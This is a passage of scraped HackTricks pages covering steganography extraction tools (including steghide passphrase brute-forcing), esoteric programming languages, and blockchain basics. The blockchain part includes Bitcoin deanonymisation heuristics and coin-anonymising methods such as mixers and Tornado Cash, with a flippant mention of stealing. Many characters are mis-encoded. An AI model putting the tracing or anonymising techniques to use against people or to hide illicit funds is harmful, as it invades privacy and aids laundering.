        "text": "Stego Tricks\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nExtracting data from all files\nBinwalk\nBinwalk is a tool for searching binary files, like images and audio files, for embedded hidden files and data.\nIt can be installed with\napt\n, and the\nsource\ncan be found on Github.\nUseful commands\n:\nbinwalk file\n: Displays the embedded data in the given file\nbinwalk -e file\n: Displays and extracts the data from the given file\nbinwalk --dd \".*\" file\n: Displays and extracts the data from the given file\nForemost\nForemost is a program that recovers files based on their headers, footers, and internal data structures. I find it especially useful when dealing with png images. You can select the files that Foremost will extract by changing the config file in\n/etc/foremost.conf.\nIt can be installed with\napt\n, and the\nsource\ncan be found on Github.\nUseful commands:\nforemost -i file\n: extracts data from the given file.\nExiftool\nSometimes, important stuff is hidden in the metadata of an image or file; exiftool can be very helpful to view file metadata.\nYou can get it from\nhere\nUseful commands:\nexiftool file\n: shows the metadata of the given file\nExiv2\nA tool similar to exiftool.\nIt can be installed with\napt\n, and the\nsource\ncan be found on Github.\nOfficial website\nUseful commands:\nexiv2 file\n: shows the metadata of the given file\nFile\nCheck out what kind of file you have\nStrings\nExtract strings from the file.\nUseful commands:\nstrings -n 6 file\n: Extract the strings with min length of 6\nstrings -n 6 file | head -n 20\n: Extract first 20 strings with min length of 6\nstrings -n 6 file | tail -n 20\n: Extract last 20 strings with min length of 6\nstrings -e s -n 6 file\n: Extract 7bit strings\nstrings -e S -n 6 file\n: Extract 8bit strings\nstrings -e l -n 6 file\n: Extract 16bit strings (little-endian)\nstrings -e b -n 6 file\n: Extract 16bit strings (big-endian)\nstrings -e L -n 6 file\n: Extract 32bit strings (little-endian)\nstrings -e B -n 6 file\n: Extract 32bit strings (big-endian)\ncmp - Comparison\nIf you have some\nmodified\nimage/audio/video, check if you can\nfind the exact original one\non the internet, then\ncompare both\nfiles with:\ncmp original.jpg stego.jpg -b -l\nExtracting hidden data in text\nHidden data in spaces\nIf you find that a\ntext line\nis\nbigger\nthan it should be, then some\nhidden information\ncould be included inside the\nspaces\nusing invisible characters.ÛêÅàÛêÅ•ÛêÅ¨ÛêÅ¨ÛêÅØÛêÄ†ÛêÅ¥ÛêÅ®\nTo\nextract\nthe\ndata\n, you can use:\nhttps://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nExtracting data from images\nidentify\n‚Äã\nGraphicMagick\ntool to check what kind of image a file is. Also checks if the image is corrupted.\n./magick identify -verbose stego.jpg\nIf the image is damaged, you may be able to restore it by simply adding a metadata comment to it (if it's very badly damaged this won't work):\n./magick mogrify\n-set\ncomment\n'Extraneous bytes removed'\nstego.jpg\nSteghide [JPEG, BMP, WAV, AU]\nSteghide is a steganography program that hides data in various kinds of image and audio files. It supports the following file formats :\nJPEG, BMP, WAV and AU\n. It‚Äôs also useful for extracting embedded and encrypted data from other files.\nIt can be installed with\napt\n, and the\nsource\ncan be found on Github.\nUseful commands:\nsteghide info file\n: displays info about whether a file has embedded data or not.\nsteghide extract -sf file [--passphrase password]\n: extracts embedded data from a file [using a password]\nYou can also extract content from steghide using the web:\nhttps://futureboy.us/stegano/decinput.html\n‚Äã\nBruteforcing\nSteghide:\nstegcracker\nstegcracker <file> [<wordlist>]\nZsteg [PNG, BMP]\nzsteg is a tool that can detect hidden data in png and bmp files.\nTo install it :\ngem install zsteg\n. The source can also be found on\nGithub\nUseful commands:\nzsteg -a file\n: Runs every detection method on the given file\nzsteg -E file\n: Extracts data with the given payload (example : zsteg -E b4,bgr,msb,xy name.png)\nstegoVeritas JPG, PNG, GIF, TIFF, BMP\nCapable of a wide variety of simple and advanced tricks, this tool can check file metadata, create transformed images, brute force LSB, and more. Check out\nstegoveritas.py -h\nto read about its full capabilities. Execute\nstegoveritas.py stego.jpg\nto run all checks.\nStegsolve\nSometimes there is a message or a text hidden in the image itself that, in order to view it, must have color filters applied, or some color levels changed. Although you can do that with something like GIMP or Photoshop, Stegsolve makes it easier. It's a small Java tool that applies many useful color filters on images; In CTF challenges, Stegsolve is often a real timesaver.\nYou can get it from\nGithub\nTo use it, just open the image and click on the\n<\n>\nbuttons.\nFFT\nTo find hidden content using Fast Fourier T:\n‚Äã\nhttp://bigwww.epfl.ch/demo/ip/demos/FFT/\n‚Äã\n‚Äã\nhttps://www.ejectamenta.com/Fourifier-fullscreen/\n‚Äã\n‚Äã\nhttps://github.com/0xcomposure/FFTStegPic\n‚Äã\npip3 install opencv-python\nStegpy [PNG, BMP, GIF, WebP, WAV]\nA program for encoding information in image and audio files through steganography. It can store the data as either plaintext or encrypted.\nFind it on\nGithub\n.\nPngcheck\nGet details on a PNG file (or even find out it's actually something else!).\napt-get install pngcheck\n: Install the tool\npngcheck stego.png\n: Obtain info about the PNG\nSome other image tools worth mentioning\n‚Äã\nhttp://magiceye.ecksdee.co.uk/\n‚Äã\n‚Äã\nhttps://29a.ch/sandbox/2012/imageerrorlevelanalysis/\n‚Äã\n‚Äã\nhttps://github.com/resurrecting-open-source-projects/outguess\n‚Äã\n‚Äã\nhttps://www.openstego.com/\n‚Äã\n‚Äã\nhttps://diit.sourceforge.net/\n‚Äã\nExtracting data from audios\n‚Äã\nSteghide [JPEG, BMP, WAV, AU]\n‚Äã\n‚Äã\nStegpy [PNG, BMP, GIF, WebP, WAV]\n‚Äã\nffmpeg\nffmpeg can be used to check the integrity of audio files, reporting various information about the file, as well as any errors it finds.\nffmpeg -v info -i stego.mp3 -f null -\nWavsteg [WAV]\nWavSteg is a Python3 tool that can hide data, using least significant bit, in wav files. It can also search for, and extract, data from wav files.\nYou can get it from\nGithub\nUseful commands:\npython3 WavSteg.py -r -b 1 -s soundfile -o outputfile\n: Extracts to an output file (taking only 1 lsb)\npython3 WavSteg.py -r -b 2 -s soundfile -o outputfile\n: Extracts to an output file (taking only 2 lsb)\nDeepsound\nHide, and check for, information encrypted with AES-265 in sound files. Download from\nthe oficial page\n.\nTo search for hidden info, simply run the program and open the sound file. If DeepSound finds any data hidden, you'll need to provide the password to unlock it.\nSonic visualizer\nSonic visualizer is a tool for viewing and analyzing the contents of audio files. It can be very helpful when facing audio steganography challenges; you can reveal hidden shapes in audio files that many other tools won't detect.\nIf you're stuck, always check the spectrogram of the audio.\nOffical Website\n‚Äã\nDTMF Tones - Dial tones\n‚Äã\nhttps://unframework.github.io/dtmf-detect/\n‚Äã\n‚Äã\nhttp://dialabc.com/sound/detect/index.html\n‚Äã\nOther tricks\nBinary length SQRT - QR Code\nIf you receive binary data with an SQRT length of an entire number, it could be some kind of QR code:\nimport math\nmath.sqrt(2500) #50\nTo convert binary \"1\"s and \"0\"s to a proper image:\nhttps://www.dcode.fr/binary-image\nTo read a QR code:\nhttps://online-barcode-reader.inliteresearch.com/\n‚Äã\nBraile\n‚Äã\nhttps://www.branah.com/braille-translator\n‚Äã\nReferences\n‚Äã\nhttps://0xrick.github.io/lists/stego/\n‚Äã\n‚Äã\nhttps://github.com/DominicBreuker/stego-toolkit\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nRC4 - Encrypt&Decrypt\nNext\n- Crypto & Stego\nEsoteric languages\nLast modified\n20d ago"
    },
    {
        "title": "Esoteric languages",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/esoteric-languages",
        "text": "Esoteric languages\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nEsolangs Wiki\n‚Äã\nCheck that wiki to search more esotreic languages\nMalbolge\n('&%:9]!~}|z2Vxwv-,POqponl$Hjig%eB@@>}=<M:9wv6WsU2T|nm-,jcL(I&%$#\"\n`CB]V?Tx<uVtT`Rpo3NlF.Jh++FdbCBA@?]!~|4XzyTT43Qsqq(Lnmkj\"Fhg${z@>\n‚Äã\nhttp://malbolge.doleczek.pl/\n‚Äã\nnpiet\n‚Äã\nhttps://www.bertnase.de/npiet/npiet-execute.php\n‚Äã\nRockstar\nMidnight takes your heart and your soul\nWhile your heart is as high as your soul\nPut your heart without your soul into your heart\n‚Äã\nGive back your heart\n‚Äã\n‚Äã\nDesire is a lovestruck ladykiller\nMy world is nothing\nFire is ice\nHate is water\nUntil my world is Desire,\nBuild my world up\nIf Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothing\nShout \"FizzBuzz!\"\nTake it to the top\n‚Äã\nIf Midnight taking my world, Fire is nothing\nShout \"Fizz!\"\nTake it to the top\n‚Äã\nIf Midnight taking my world, Hate is nothing\nSay \"Buzz!\"\nTake it to the top\n‚Äã\nWhisper my world\nrockstar : home\nPETOOH\nKoKoKoKoKoKoKoKoKoKo Kud-Kudah\nKoKoKoKoKoKoKoKo kudah kO kud-Kudah Kukarek kudah\nKoKoKo Kud-Kudah\nkOkOkOkO kudah kO kud-Kudah Ko Kukarek kudah\nKoKoKoKo Kud-Kudah KoKoKoKo kudah kO kud-Kudah kO Kukarek\nkOkOkOkOkO Kukarek Kukarek kOkOkOkOkOkOkO\nKukarek\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nCrypto & Stego -\nPrevious\nStego Tricks\nNext\n- Crypto & Stego\nBlockchain & Crypto Currencies\nLast modified\n6mo ago"
    },
    {
        "title": "Blockchain & Crypto Currencies",
        "url": "https://book.hacktricks.xyz/crypto-and-stego/blockchain-and-crypto-currencies",
        "text": "Blockchain & Crypto Currencies\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Terminology\nSmart contract\n: Smart contracts are simply\nprograms stored on a blockchain that run when predetermined conditions are met\n. They typically are used to automate the\nexecution\nof an\nagreement\nso that all participants can be immediately certain of the outcome, without any intermediary‚Äôs involvement or time loss. (From\nhere\n).\nBasically, a smart contract is a\npiece of code\nthat is going to be executed when people access and accept the contract. Smart contracts\nrun in blockchains\n(so the results are stored inmutable) and can be read by the people before accepting them.\ndApps\n:\nDecentralised applications\nare implemented on top of\nsmart\ncontracts\n. They usually have a front-end where the user can interact with the app, the\nback-end\nis public (so it can be audited) and is implemented as a\nsmart contract\n. Sometimes the use of a database is needed, Ethereum blockchain allocates certain storage to each account.\nTokens & coins\n: A\ncoin\nis a cryptocurrency that act as\ndigital\nmoney\nand a\ntoken\nis something that\nrepresents\nsome\nvalue\nbut it's not a coin.\nUtility Tokens\n: These tokens allow the user to\naccess certain service later\n(it's something that have some value in a specific environment).\nSecurity Tokens\n: These represents the\nownership\nor some asset.\nDeFi\n:\nDecentralized Finance\n.\nDEX: Decentralized Exchange Platforms\n.\nDAOs\n:\nDecentralized Autonomous Organizations\n.\nConsensus Mechanisms\nFor a blockchain transaction to be recognized, it must be\nappended\nto the\nblockchain\n. Validators (miners) carry out this appending; in most protocols, they\nreceive a reward\nfor doing so. For the blockchain to remain secure, it must have a mechanism to\nprevent a malicious user or group from taking over a majority of validation\n.\nProof of work, another commonly used consensus mechanism, uses a validation of computational prowess to verify transactions, requiring a potential attacker to acquire a large fraction of the computational power of the validator network.\nProof Of Work (PoW)\nThis uses a\nvalidation of computational prowess\nto verify transactions, requiring a potential attacker to acquire a large fraction of the computational power of the validator network.\nThe\nminers\nwill\nselect several transactions\nand then start\ncomputing the Proof Of Work\n. The\nminer with the greatest computation resources\nis more probably to\nfinish\nearlier\nthe Proof of Work and get the fees of all the transactions.\nProof Of Stake (PoS)\nPoS accomplishes this by\nrequiring that validators have some quantity of blockchain tokens\n, requiring\npotential attackers to acquire a large fraction of the tokens\non the blockchain to mount an attack.\nIn this kind of consensus, the more tokens a miner has, the more probably it will be that the miner will be asked to create the next block.\nCompared with PoW, this greatly\nreduced the energy consumption\nthe miners are expending.\nBitcoin\nTransactions\nA simple\ntransaction\nis a\nmovement of money\nfrom an address to another one.\nAn\naddress\nin bitcoin is the hash of the\npublic\nkey\n, therefore, someone in order to make a transaction from an address he needs to know the private key associated to that public key (the address).\nThen, when a\ntransaction\nis performed, it's\nsigned\nwith the private key of the address to show that the transaction is\nlegit\n.\nThe first part of producing a digital signature in Bitcoin can be represented mathematically in the following way:\nSig\n=\nFsig\n(\nFhash\n(\nm\n),\ndA\n)\nWhere:\n_d_A is the signing\nprivate key\nm\nis the\ntransaction\nFhash is the hashing function\nFsig is the signing algorithm\nSig is the resulting signature\nThe signing function (Fsig) produces a signature (Sig) that comprises of two values: R and S:\nSig = (R, S)\nOnce R and S have been calculated, they are serialized into a byte stream that is encoded using an international standard encoding scheme that is known as the Distinguished Encoding Rules (or DER). In order to verify that the signature is valid, a signature verification algorithm is used. Verification of a digital signature requires the following:\nSignature (R and S)\nTransaction hash\nThe public key that corresponds to the private key that was used to create the signature\nVerification of a signature effectively means that only the owner of the private key (that generated the public key) could have produced the signature on the transaction. The signature verification algorithm will return ‚ÄòTRUE‚Äô if the signature is indeed valid.\nMultisignature Transactions\nA multi-signature\naddress\nis an address that is associated with more than one ECDSA private key. The simplest type is an m-of-n address - it is associated with n private keys, and sending bitcoins from this address requires signatures from at least m keys. A multi-signature\ntransaction\nis one that sends funds from a multi-signature address.\nTransactions Fields\nEach bitcoin transaction has several fields:\nInputs\n: The amount and address\nfrom\nwhere\nbitcoins\nare\nbeing\ntransferred\nOutputs\n: The address and amounts that each\ntransferred\nto\neach\noutput\nFee:\nThe amount of\nmoney\nthat is\npayed\nto the\nminer\nof the transaction\nScript_sig\n: Script signature of the transaction\nScript_type\n: Type of transaction\nThere are\n2 main types\nof transactions:\nP2PKH: \"Pay To Public Key Hash\"\n: This is how transactions are made. You are requiring the\nsender\nto supply a valid\nsignature\n(from the private key) and\npublic\nkey\n. The transaction output script will use the signature and public key and through some cryptographic functions will check\nif it matches\nwith the public key hash, if it does, then the\nfunds\nwill be\nspendable\n. This method conceals your public key in the form of a hash for extra security.\nP2SH: \"Pay To Script Hash\":\nThe outputs of a transaction are just\nscripts\n(this means the person how want this money send a script) that, if are\nexecuted with specific parameters, will result in a boolean of\ntrue\nor\nfalse\n. If a miner runs the output script with the supplied parameters and results in\ntrue\n, the\nmoney will be sent to your desired output\n.\nP2SH\nis used for\nmulti-signature\nwallets making the output scripts\nlogic that checks for multiple signatures before accepting the transaction\n.\nP2SH\ncan also be used to allow anyone, or no one, to spend the funds. If the output script of a P2SH transaction is just\n1\nfor true, then attempting to spend the output without supplying parameters will just result in\n1\nmaking the money spendable by anyone who tries. This also applies to scripts that return\n0\n, making the output spendable by no one.\nLightning Network\nThis protocol helps to\nperform several transactions to a channe\nl and\njust\nsent\nthe\nfinal\nstate\nto the blockchain to save it.\nThis\nimproves\nbitcoin blockchain\nspeed\n(it just on allow 7 payments per second) and it allows to create\ntransactions more difficult to trace\nas the channel is created via nodes of the bitcoin blockchain:\nNormal use of the Lightning Network consists of\nopening a payment channel\nby committing a funding transaction to the relevant base blockchain (layer 1), followed by making\nany number\nof Lightning Network\ntransactions\nthat update the tentative distribution of the channel's funds\nwithout broadcasting those to the blockchain\n, optionally followed by closing the payment channel by\nbroadcasting\nthe\nfinal\nversion\nof the settlement transaction to distribute the channel's funds.\nNote that any of the both members of the channel can stop and send the final state of the channel to the blockchain at any time.\nBitcoin Privacy Attacks\nCommon Input\nTheoretically the inputs of one transaction can belong to different users, but in reality that is unusual as it requires extra steps. Therefore, very often it can be assumed that\n2 input addresses in the same transaction belongs to the same owner\n.\nUTXO Change Address Detection\nUTXO\nmeans\nUnspent Transaction Outputs\n(UTXOs). In a transaction that uses the output from a previous transaction as an input, the\nwhole output need to be spent\n(to avoid double-spend attacks). Therefore, if the intention was to\nsend\njust\npart\nof the money from that output to an address and\nkeep\nthe\nother\npart\n,\n2 different outputs\nwill appear: the\nintended\none and a\nrandom new change address\nwhere the rest of the money will be saved.\nThen, a watcher can make the assumption that\nthe new change address generated belong to the owner of the UTXO\n.\nSocial Networks & Forums\nSome people gives data about theirs bitcoin addresses in different webs on Internet.\nThis make pretty easy to identify the owner of an address\n.\nTransaction Graphs\nBy representing the transactions in graphs, i\nt's possible to know with certain probability to where the money of an account were\n. Therefore, it's possible to know something about\nusers\nthat are\nrelated\nin the blockchain.\nUnnecessary input heuristic\nAlso called the \"optimal change heuristic\". Consider this bitcoin transaction. It has two inputs worth 2 BTC and 3 BTC and two outputs worth 4 BTC and 1 BTC.\n2 btc --> 4 btc\n3 btc     1 btc\nAssuming one of the outputs is change and the other output is the payment. There are two interpretations: the payment output is either the 4 BTC output or the 1 BTC output. But if the 1 BTC output is the payment amount then the 3 BTC input is unnecessary, as the wallet could have spent only the 2 BTC input and paid lower miner fees for doing so. This is an indication that the real payment output is 4 BTC and that 1 BTC is the change output.\nThis is an issue for transactions which have more than one input. One way to fix this leak is to add more inputs until the change output is higher than any input, for example:\n2 btc --> 4 btc\n3 btc     6 btc\n5 btc\nForced address reuse\nForced address reuse\nor\nincentivized address reuse\nis when an adversary pays an (often small) amount of bitcoin to addresses that have already been used on the block chain. The adversary hopes that users or their wallet software\nwill use the payments as inputs to a larger transaction which will reveal other addresses via the the common-input-ownership\nheuristic. These payments can be understood as a way to coerce the address owner into unintentional address reuse.\nThis attack is sometimes incorrectly called a\ndust attack\n.\nThe correct behaviour by wallets is to not spend coins that have landed on an already-used empty addresses.\nOther Blockchain Analysis\nExact Payment Amounts\n: In order to avoid transactions with a change, the payment needs to be equal to the UTXO (which is highly unexpected). Therefore, a\ntransaction with no change address are probably transfer between 2 addresses of the same user\n.\nRound Numbers\n: In a transaction, if one of the outputs is a \"\nround number\n\", it's highly probable that this is a\npayment to a human that put that\n\"round number\"\nprice\n, so the other part must be the leftover.\nWallet fingerprinting:\nA careful analyst sometimes deduce which software created a certain transaction, because the many\ndifferent wallet softwares don't always create transactions in exactly the same way\n. Wallet fingerprinting can be used to detect change outputs because a change output is the one spent with the same wallet fingerprint.\nAmount & Timing correlations\n: If the person that performed the transaction\ndiscloses\nthe\ntime\nand/or\namount\nof the transaction, it can be easily\ndiscoverable\n.\nTraffic analysis\nSome organisation\nsniffing your traffic\ncan see you communicating in the bitcoin network.\nIf the adversary sees a transaction or block\ncoming out of your node which did not previously enter\n, then it can know with near-certainty that\nthe transaction was made by you or the block was mined by you\n. As internet connections are involved, the adversary will be able to\nlink the IP address with the discovered bitcoin information\n.\nAn attacker that isn't able to sniff all the Internet traffic but that has\na lot of Bitcoin nodes\nin order to stay\ncloser\nto the s\no\nurces could be able to know the IP address that are announcing transactions or blocks.\nAlso, some wallets periodically rebroadcast their unconfirmed transactions so that they are more likely to propagate widely through the network and be mined.\nOther attacks to find info about the owner of addresses\nFor more attacks read\nhttps://en.bitcoin.it/wiki/Privacy\n‚Äã\nAnonymous Bitcoins\nObtaining Bitcoins Anonymously\nCash trades:\nBuy bitcoin using cash.\nCash substitute:\nBuy gift cards or similar and exchange them for bitcoin online.\nMining:\nMining is the most anonymous way to obtain bitcoin. This applies to solo-mining as\nmining pools\ngenerally know the hasher's IP address.\nStealing:\nIn theory another way of obtaining anonymous bitcoin is to steal them.\nMixers\nA user would\nsend bitcoins to a mixing service\nand the service would\nsend different bitcoins back to the user\n, minus a fee. In theory an adversary observing the blockchain would be\nunable to link\nthe incoming and outgoing transactions.\nHowever, the user needs to trust the mixing service to return the bitcoin and also to not be saving logs about the relations between the money received and sent.\nSome other services can be also used as mixers, like Bitcoin casinos where you can send bitcoins and retrieve them later.\nCoinJoin\nCoinJoin\nwill\nmix several transactions of different users into just one\nin order to make more\ndifficult\nfor an observer to find out\nwhich input is related to which output\n.\nThis offers a new level of privacy, however,\nsome\ntransactions\nwhere some input and output amounts are correlated or are very different from the rest of the inputs and outputs\ncan still be correlated\nby the external observer.\nExamples of (likely) CoinJoin transactions IDs on bitcoin's blockchain are\n402d3e1df685d1fdf82f36b220079c1bf44db227df2d676625ebcbee3f6cb22a\nand\n85378815f6ee170aa8c26694ee2df42b99cff7fa9357f073c1192fff1f540238\n.\n‚Äã\nhttps://coinjoin.io/en\nSimilar to coinjoin but better and for ethereum you have\nTornado Cash\n(the money is given from miners, so it jus appear in your waller).\nPayJoin\nThe type of CoinJoin discussed in the previous section can be easily identified as such by checking for the multiple outputs with the same value.\nPayJoin (also called pay-to-end-point or P2EP) is a special type of CoinJoin between two parties where one party pays the other. The transaction then\ndoesn't have the distinctive multiple outputs\nwith the same value, and so is not obviously visible as an equal-output CoinJoin. Consider this transaction:\n2 btc --> 3 btc\n5 btc     4 btc\nIt could be interpreted as a simple transaction paying to somewhere with leftover change (ignore for now the question of which output is payment and which is change). Another way to interpret this transaction is that the 2 BTC input is owned by a merchant and 5 BTC is owned by their customer, and that this transaction involves the customer paying 1 BTC to the merchant. There is no way to tell which of these two interpretations is correct. The result is a coinjoin transaction that breaks the common-input-ownership heuristic and improves privacy, but is also\nundetectable and indistinguishable from any regular bitcoin transaction\n.\nIf PayJoin transactions became even moderately used then it would make the\ncommon-input-ownership heuristic be completely flawed in practice\n. As they are undetectable we wouldn't even know whether they are being used today. As transaction surveillance companies mostly depend on that heuristic, as of 2019 there is great excitement about the PayJoin idea.\nBitcoin Privacy Good Practices\nWallet Synchronization\nBitcoin wallets must somehow obtain information about their balance and history. As of late-2018 the most practical and private existing solutions are to use a\nfull node wallet\n(which is maximally private) and\nclient-side block filtering\n(which is very good).\nFull node:\nFull nodes download the entire blockchain which contains every on-chain\ntransaction\nthat has ever happened in bitcoin. So an adversary watching the user's internet connection will not be able to learn which transactions or addresses the user is interested in.\nClient-side block filtering:\nClient-side block filtering works by having\nfilters\ncreated that contains all the\naddresses\nfor every transaction in a block. The filters can test whether an\nelement is in the set\n; false positives are possible but not false negatives. A lightweight wallet would\ndownload\nall the filters for every\nblock\nin the\nblockchain\nand check for matches with its\nown\naddresses\n. Blocks which contain matches would be downloaded in full from the peer-to-peer network, and those blocks would be used to obtain the wallet's history and current balance.\nTor\nBitcoin network uses a peer-to-peer network, which means that other peers can learn your IP address. This is why it's recommend to\nconnect through Tor every time you want to interact with the bitcoin network\n.\nAvoiding address reuse\nAddresses being used more than once is very damaging to privacy because that links together more blockchain transactions with proof that they were created by the same entity\n. The most private and secure way to use bitcoin is to send a brand\nnew address to each person who pays you\n. After the received coins have been spent the address should never be used again. Also, a brand new bitcoin address should be demanded when sending bitcoin. All good bitcoin wallets have a user interface which discourages address reuse.\nMultiple transactions\nPaying\nsomeone with\nmore than one on-chain transaction\ncan greatly reduce the power of amount-based privacy attacks such as amount correlation and round numbers. For example, if the user wants to pay 5 BTC to somebody and they don't want the 5 BTC value to be easily searched for, then they can send two transactions for the value of 2 BTC and 3 BTC which together add up to 5 BTC.\nChange avoidance\nChange avoidance is where transaction inputs and outputs are carefully chosen to not require a change output at all.\nNot having a change output is excellent for privacy\n, as it breaks change detection heuristics.\nMultiple change outputs\nIf change avoidance is not an option then\ncreating more than one change output can improve privacy\n. This also breaks change detection heuristics which usually assume there is only a single change output. As this method uses more block space than usual, change avoidance is preferable.\nMonero\nWhen Monero was developed, the gaping need for\ncomplete anonymity\nwas what it sought to resolve, and to a large extent, it has filled that void.\nEthereum\nGas\nGas refers to the unit that measures the\namount\nof\ncomputational\neffort\nrequired to execute specific operations on the Ethereum network. Gas refers to the\nfee\nrequired to successfully conduct a\ntransaction\non Ethereum.\nGas prices are denoted in\ngwei\n, which itself is a denomination of ETH - each gwei is equal to\n0.000000001 ETH\n(10-9 ETH). For example, instead of saying that your gas costs 0.000000001 ether, you can say your gas costs 1 gwei. The word 'gwei' itself means 'giga-wei', and it is equal to\n1,000,000,000 wei\n. Wei itself is the\nsmallest unit of ETH\n.\nTo calculate the gas that a transaction is going to cost read this example:\nLet‚Äôs say Jordan has to pay Taylor 1 ETH. In the transaction the gas limit is 21,000 units and the base fee is 100 gwei. Jordan includes a tip of 10 gwei.\nUsing the formula above we can calculate this as\n21,000 * (100 + 10) = 2,310,000 gwei\nor 0.00231 ETH.\nWhen Jordan sends the money, 1.00231 ETH will be deducted from Jordan's account. Taylor will be credited 1.0000 ETH. Miner receives the tip of 0.00021 ETH. Base fee of 0.0021 ETH is burned.\nAdditionally, Jordan can also set a max fee (\nmaxFeePerGas\n) for the transaction. The difference between the max fee and the actual fee is refunded to Jordan, i.e.\nrefund = max fee - (base fee + priority fee)\n. Jordan can set a maximum amount to pay for the transaction to execute and not worry about overpaying \"beyond\" the base fee when the transaction is executed.\nAs the base fee is calculated by the network based on demand for block space, this last param: maxFeePerGas helps to control the maximum fee that is going to be payed.\nTransactions\nNotice that in the\nEthereum\nnetwork a transaction is performed between 2 addresses and these can be\nuser or smart contract addresses\n.\nSmart Contracts\nare stored in the distributed ledger via a\nspecial\ntransaction\n.\nTransactions, which change the state of the EVM, need to be broadcast to the whole network. Any node can broadcast a request for a transaction to be executed on the EVM; after this happens, a\nminer\nwill\nexecute\nthe\ntransaction\nand propagate the resulting state change to the rest of the network.\nTransactions require a\nfee\nand must be mined to become valid.\nA submitted transaction includes the following information:\nrecipient\n‚Äì the receiving address (if an externally-owned account, the transaction will transfer value. If a contract account, the transaction will execute the contract code)\nsignature\n‚Äì the identifier of the sender. This is generated when the sender's private key signs the transaction and confirms the sender has authorised this transaction\nvalue\n‚Äì amount of ETH to transfer from sender to recipient (in WEI, a denomination of ETH)\ndata\n‚Äì optional field to include arbitrary data\ngasLimit\n‚Äì the maximum amount of gas units that can be consumed by the transaction. Units of gas represent computational steps\nmaxPriorityFeePerGas\n- the maximum amount of gas to be included as a tip to the miner\nmaxFeePerGas\n- the maximum amount of gas willing to be paid for the transaction (inclusive of\nbaseFeePerGas\nand\nmaxPriorityFeePerGas\n)\nNote that there isn't any field for the origin address, this is because this can be extrapolated from the 